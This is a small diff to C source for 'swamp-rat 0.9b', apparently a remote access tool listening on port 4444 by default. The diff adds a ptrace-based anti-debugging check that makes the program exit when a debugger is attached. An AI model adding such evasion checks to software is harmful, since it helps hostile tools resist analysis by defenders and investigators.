@@ -24,6 +24,7 @@
 #include <stdbool.h>
 #include <argp.h>
 #include "include/main/ncurses.h"
+#include "include/stub/re.h"
 //#include "include/main/net.h"
 
 const char *program_version = "swamp-rat 0.9b";
@@ -71,6 +72,10 @@ static struct argp argp = {
 };
 
 int main(int argc, char **argv){
+  if (re_ptrace() == true){
+    printf("stop touching meEEEE!!!\n");
+    return EXIT_FAILURE;
+  }
   struct arguments arguments;
   arguments.port = 4444;
   argp_parse(&argp, argc, argv, 0, 0, &arguments);
